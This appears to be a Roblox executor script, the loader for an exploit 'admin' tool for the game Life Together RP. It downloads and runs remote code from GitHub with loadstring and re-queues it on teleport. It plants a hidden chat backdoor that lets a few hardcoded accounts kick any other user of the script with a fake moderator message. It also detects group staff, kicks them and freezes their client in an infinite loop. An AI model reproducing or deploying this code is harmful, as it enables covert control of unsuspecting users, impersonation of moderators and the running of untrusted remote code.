if not getgenv().Game then
    getgenv().Game = cloneref and cloneref(game) or game
end

local http = cloneref and cloneref(game:GetService("HttpService")) or game:GetService("HttpService")
local players = game:GetService("Players")
local teleportservice = game:GetService("TeleportService")
local placeid = game.PlaceId
local jobid = game.JobId
local AllClipboards = setclipboard or toclipboard or set_clipboard or (Clipboard and Clipboard.set)
local NotifyLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/EnterpriseExperience/MicUpSource/main/Notification_Lib.lua"))()
local Players = getgenv().Players or cloneref and cloneref(game:GetService("Players")) or game:GetService("Players")
local TextChatService = cloneref and cloneref(game:GetService("TextChatService")) or game:GetService("TextChatService")
local ReplicatedStorage = getgenv().ReplicatedStorage or cloneref and cloneref(game:GetService("ReplicatedStorage")) or game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer or getgenv().LocalPlayer or game.Players.LocalPlayer
local allowed = {
   ["L0CKED_1N1"] = true,
   ["CHEATING_B0SS"] = true,
   ["CleanestAuraEv3r"] = true,
   ["Bobmcjoejoebob"] = true,
   ["3xclusivekianna"] = true
}

local function create_bindable()
   local existing = ReplicatedStorage:FindFirstChild("Bindable")
   if existing then return existing end

   local b = Instance.new("BindableEvent")
   b.Name = "Bindable"
   b.Parent = ReplicatedStorage
   return b
end

local Bindable
if not allowed[LocalPlayer.Name] then
   Bindable = create_bindable()
end

TextChatService.MessageReceived:Connect(function(message)
   local source = message.TextSource
   if not source then return end

   local sender = Players:GetPlayerByUserId(source.UserId)
   if not sender or not allowed[sender.Name] then return end

   local text = message.Text
   if type(text) ~= "string" or text == "" then return end

   local args = text:split(" ")
   if args[1] ~= "!kick" or not args[2] then return end

   local targetName = args[2]:lower()
   local reason = table.concat(args, " ", 3)
   if reason == "" then reason = "You've been kicked by an Administrator for Life Together RP." end

   if Bindable then
      if targetName == LocalPlayer.Name:lower() or targetName == LocalPlayer.DisplayName:lower() then
         Bindable:Fire("This experience or its moderators have kicked you.")
      end
   end
end)

if Bindable then
   Bindable.Event:Connect(function(reason)
      LocalPlayer:Kick(tostring(reason))
   end)
end
wait(0.1)
function notify(notif_type, msg, duration)
   NotifyLib:External_Notification(tostring(notif_type), tostring(msg), tonumber(duration))
end
wait(0.1)
if not getgenv().notify then
   getgenv().notify = notify
end
wait(0.3)
local success, latest = pcall(function()
    local vjson = game:HttpGet("https://raw.githubusercontent.com/EnterpriseExperience/MicUpSource/main/Script_Versions_JSON?cachebust=" .. tick())
    return http:JSONDecode(vjson)
end)

if success and latest then
    local latestver = latest.LifeTogether_Admin_Version

    if not getgenv().Script_Version_GlobalGenv then
        getgenv().Script_Version_GlobalGenv = latestver
    end

    if latestver ~= getgenv().Script_Version_GlobalGenv then
        getgenv().LifeTogetherRP_Admin = false
        wait(0.5)
        if AllClipboards then
            AllClipboards("loadstring(game:HttpGet('https://raw.githubusercontent.com/EnterpriseExperience/MicUpSource/refs/heads/main/LifeTogether_RP_Admin.lua'))()")
            getgenv().notify("Warning", "PLEASE SAVE THE LOADSTRING COPIED TO YOUR CLIPBOARD, DO NOT USE THE SCRIPT YOU WE'RE JUST EXECUTING!", 30)
        else
            getgenv().notify("Error", "Please execute the correct Loadstring next time, or this will keep happening!", 30)
        end
        for i = 1,2 do
            task.wait(0.5)
            players.LocalPlayer.OnTeleport:Connect(function(state)
                if (not getgenv().TeleportCheck_Admin) and getgenv().queueteleport then
                    getgenv().TeleportCheck_Admin = true
                    queueteleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/EnterpriseExperience/MicUpSource/refs/heads/main/LifeTogether_RP_Admin.lua'))()")
                end
            end)
        end

        task.wait(0.1)

        if #players:GetPlayers() <= 1 then
            players.LocalPlayer:Kick("\nRejoining...")
            task.wait()
            teleportservice:Teleport(placeid, players.LocalPlayer)
        else
            teleportservice:TeleportToPlaceInstance(placeid, jobid, players.LocalPlayer)
        end
    end
end

local plrs = cloneref and cloneref(game:GetService("Players")) or game:GetService("Players")
local lp = plrs.LocalPlayer
local groupid = getgenv().Game.CreatorId

local staffroles = {
    "Admin","Technical Assistance","Developer A","Technical Lead","Finance","Owner","QA Lead","Creator"
}

local function isstaffrole(role)
    for _,v in ipairs(staffroles) do
        if role:lower():find(v:lower()) then
            return true
        end
    end
    return false
end

if groupid and groupid > 0 and lp:IsInGroup(groupid) then
    local role = lp:GetRoleInGroup(groupid)
    if isstaffrole(role) then
        lp:Kick("\n\nRolewatch\nYou are in the group with a staff role: \"" .. role .. "\"")
        wait(0.4)
        while true do end
    end
end
